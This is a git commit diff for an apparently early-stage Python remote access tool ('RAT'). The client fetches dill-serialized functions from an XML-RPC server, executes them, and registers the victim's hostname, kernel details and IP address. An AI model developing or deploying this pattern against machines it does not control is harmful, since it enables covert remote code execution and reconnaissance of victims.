ddf93ab6ba31323a90b435d4a9a90d954081faf4
Samuel Barthelemy <wasupwithuman@users.noreply.github.com>
2017-06-17 15:37:28 -0400

    Changes

--- ratClient.py
+++ ratClient.py
@@ -2,7 +2,7 @@
 from xmlrpc import client
 import dill
 
-server_ip = '192.168.1.6'
+server_ip = '192.168.1.163'
 server_port = 4000
 
 
@@ -17,15 +17,7 @@ def convert_from(obj):
 class RatClient():
 
     def __init__(self):
-        self.rat_client = client.ServerProxy("http://{0}:{1}"
-                                             .format(server_ip, server_port))
-
-    def get_system_information(self, os, socket):
-        host_name = socket.gethostname()
-        kernel_info = os.uname()
-        ip_address = socket.gethostbyname(host_name)
-        result = [host_name, kernel_info, ip_address]
-        return result
+        self.rat_client = client.ServerProxy("http://{0}:{1}".format(server_ip, server_port))
 
 
 if __name__ == '__main__':
@@ -33,10 +25,11 @@ if __name__ == '__main__':
     req_libs = convert_from(rat.rat_client.rcv_req_libs())
     os = req_libs[0]
     socket = req_libs[1]
-    rat.rat_client.register_client(convert_to(rat.get_system_information(os, socket)))
-    server_package = convert_from(rat.rat_client.create_client_server())
-    server = server_package[0]
-    client_server_module = server_package[1]
-    client_server = client_server_module(server_ip="192.168.1.6", server_port=4001)
-    client_server.rat_server.register_function(client_server.register_client, 'register_client')
-    client_server.rat_server.serve_forever()
+    platform = req_libs[2]
+    rat.rat_client.register_client(convert_to(convert_from(rat.rat_client.sys_info())()))
+    # server_package = convert_from(rat.rat_client.create_client_server())
+    # server = server_package[0]
+    # client_server_module = server_package[1]
+    # # client_server = client_server_module(server_ip="192.168.1.6", server_port=4001)
+    # client_server.rat_server.register_function(client_server.register_client, 'register_client')
+    # client_server.rat_server.serve_forever()
--- ratServer.py
+++ ratServer.py
@@ -4,9 +4,10 @@ from xmlrpc import server, client
 import socket
 import dill
 import os
+import platform
 
-
-server_ip = socket.gethostbyname(socket.gethostname())
+# server_ip = socket.gethostbyname(socket.gethostname())
+server_ip = "0.0.0.0"
 server_port = 4000
 
 
@@ -18,10 +19,16 @@ def convert_from(obj):
     return dill.loads(obj.data)
 
 
+def get_system_information():
+    kernel_info = platform.uname()
+    ip_address = socket.gethostbyname(kernel_info.node)
+    result = [kernel_info, ip_address]
+    return result
+
+
 class Connected_client():
 
     def __init__(self, hostname, kernel_info, ip_address):
-
         self.hostname = hostname
         self.kernel_info = kernel_info
         self.ip_address = ip_address
@@ -34,21 +41,30 @@ class RatServer:
                                                     allow_none=True)
         self.list_of_clients = []
 
-
     def register_client(self, system_info):
         rat_client_system = convert_from(system_info)
-        self.list_of_clients.append(Connected_client(hostname=rat_client_system[0],
-                                                     kernel_info=rat_client_system[1],
-                                                     ip_address=rat_client_system[2]))
+        self.list_of_clients.append(Connected_client(hostname=rat_client_system[0].node,
+                                                     kernel_info=rat_client_system[0],
+                                                     ip_address=rat_client_system[1]))
         print("Added {} to the list of clients".format(rat_client_system[0]))
+        for clients in self.list_of_clients:
+            print("###################")
+            print(clients.hostname)
+            for item in clients.kernel_info:
+                print(item)
+            print(clients.ip_address)
+            print("###################")
 
     def create_client_server(self):
         server_package = (server, RatServer)
         return convert_to(server_package)
 
     def send_required_libraries(self):
-        req_libraries = (os, socket)
+        req_libraries = (os, socket, platform)
         return convert_to(req_libraries)
+
+    def sys_info(self):
+        return convert_to(get_system_information)
 
 
 if __name__ == '__main__':
@@ -56,4 +72,5 @@ if __name__ == '__main__':
     rat.rat_server.register_function(rat.register_client, 'register_client')
     rat.rat_server.register_function(rat.create_client_server, 'create_client_server')
     rat.rat_server.register_function(rat.send_required_libraries, 'rcv_req_libs')
+    rat.rat_server.register_function(rat.sys_info, 'sys_info')
     rat.rat_server.serve_forever()
